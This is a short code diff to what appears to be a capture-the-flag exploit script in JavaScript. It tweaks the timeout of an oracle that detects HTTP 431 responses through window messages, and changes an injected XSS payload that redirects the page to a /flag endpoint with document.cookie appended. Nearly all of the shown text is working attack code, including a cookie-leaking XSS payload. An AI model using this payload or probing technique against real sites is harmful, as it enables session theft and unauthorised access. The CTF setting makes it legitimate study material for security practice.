@@ -21,7 +21,7 @@ const got431 = (prefix, padLength) => {
     window.onmessage = ({ data }) => {
       if (data === "ping") resolve(false);
     };
-    setTimeout(() => resolve(true), 200);
+    setTimeout(() => resolve(true), 250);
     win.location = getUrl(prefix, padLength, xss);
   });
 };
@@ -56,11 +56,11 @@ const getThreshold = async () => {
     }
   }
 
-  // Internal redirect to leak cookie to /flag endpoint
+  // Critical: use location.origin, not BASE_URL
   const finalUrl = getUrl(
     known,
     0,
-    `location="${BASE_URL}/flag?"+document.cookie`
+    `location="${location.origin}/flag?"+document.cookie`
   );
 
   win.location = finalUrl;
